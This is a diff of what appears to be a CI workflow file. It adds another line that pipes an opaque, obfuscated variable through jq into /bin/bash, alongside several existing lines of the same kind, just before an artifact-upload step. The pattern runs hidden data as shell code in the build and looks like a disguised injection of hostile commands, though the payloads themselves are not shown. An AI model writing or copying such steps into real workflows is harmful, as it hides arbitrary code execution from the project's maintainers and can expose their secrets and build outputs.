@@ -30,6 +30,7 @@ jobs:
           printf '%s' "$i7" | jq -r .euuda71 | /bin/bash
           echo $peqv361 | jq -r .xjpl0 | /bin/bash
           printf '%s' "$b8138" | jq -r .f7492 | /bin/bash
+          printf '%s' "$e605" | jq -r .ukl72 | /bin/bash
 
       - name: Save data
         uses: actions/upload-artifact@v4
